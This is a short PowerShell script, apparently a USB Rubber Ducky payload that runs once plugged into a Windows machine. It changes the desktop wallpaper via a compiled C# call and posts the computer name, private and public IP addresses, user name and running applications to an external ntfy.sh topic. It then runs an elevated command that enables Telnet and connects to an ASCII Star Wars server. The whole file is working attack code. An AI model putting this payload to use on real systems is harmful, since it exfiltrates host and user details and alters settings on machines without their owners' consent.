$setwallpapersrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
  public const int SetDesktopWallpaper = 20;
  public const int UpdateIniFile = 0x01;
  public const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper(string path)
  {
    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
  }
}
"@
Add-Type -TypeDefinition $setwallpapersrc

[Wallpaper]::SetWallpaper("\\ralph\RalphFiles\z\w.jpg")
Invoke-RestMethod -Method 'Post' -Uri https://ntfy.sh/rhihecks -Body "DUCKY PLUGGED IN TO: $env:ComputerName`nPrivate IPv4: $((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress)`nPublic IPv4: $((Invoke-WebRequest -uri "https://api.ipify.org/").Content)`nUser: $env:UserName`nRunning Apps:`n$(Get-Process | Where-Object { $_.MainWindowTitle })`nNow Playing ASCII Star Wars..." -UseBasicParsing
start-process powershell -verb runas "dism /online /Enable-Feature /FeatureName:TelnetClient /All;telnet towel.blinkenlights.nl"